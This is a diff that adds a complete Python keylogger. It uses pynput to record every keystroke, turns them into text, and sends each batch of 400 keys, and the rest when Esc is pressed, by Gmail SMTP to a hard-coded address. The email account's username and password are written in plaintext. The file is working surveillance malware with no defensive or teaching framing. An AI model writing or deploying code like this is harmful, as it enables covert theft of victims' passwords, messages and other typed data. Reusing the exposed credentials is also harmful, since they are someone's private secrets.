@@ -1,0 +1,67 @@
+from pynput.keyboard import Key, Listener
+import smtplib
+
+count = 0
+keys = []
+text = ""
+
+def send_email(text):
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s.ehlo()
+    s.starttls()
+    s.login("bferchesa", "12345budincutze")
+    msg = 'Subject: {}\n\n{}'.format("KeyLogger", text)
+    s.sendmail("bferchesa@gmail.com", "bferchesa@gmail.com", str(msg))
+    s.quit()
+
+def write_text(keys):
+    global text
+    for key in keys:
+        k = str(key).replace("'", "")
+        if k.find("backspace") > 0:
+            text = text + '*'
+        elif k.find("space") > 0:
+            text = text + ' '
+        elif k.find("enter") > 0:
+            text = text + '\n'
+        elif k.find("Key") == -1:
+            text = text + str(k)
+
+# def write_file(keys):
+#     with open("log.txt", "a+") as f:
+#         for key in keys:
+#             k = str(key).replace("'","")
+#             if k.find("backspace") > 0:
+#                 f.write('*')
+#             elif k.find("space") > 0:
+#                 f.write(' ')
+#             elif k.find("enter") > 0:
+#                 f.write('\n')
+#             elif k.find("Key") == -1:
+#                 f.write(k)
+
+def on_press(key):
+    global keys, count, text
+
+    keys.append(key)
+    count += 1
+
+    if count >= 400:
+        count = 0
+        #write_file(keys)
+        write_text(keys)
+        send_email(text)
+        text = ""
+        keys = []
+
+
+def on_release(key):
+    global text, keys
+    if key == Key.esc:
+        write_text(keys)
+        send_email(text)
+        return False
+
+with Listener( on_press=on_press, on_release=on_release ) as listener:
+    listener.join()
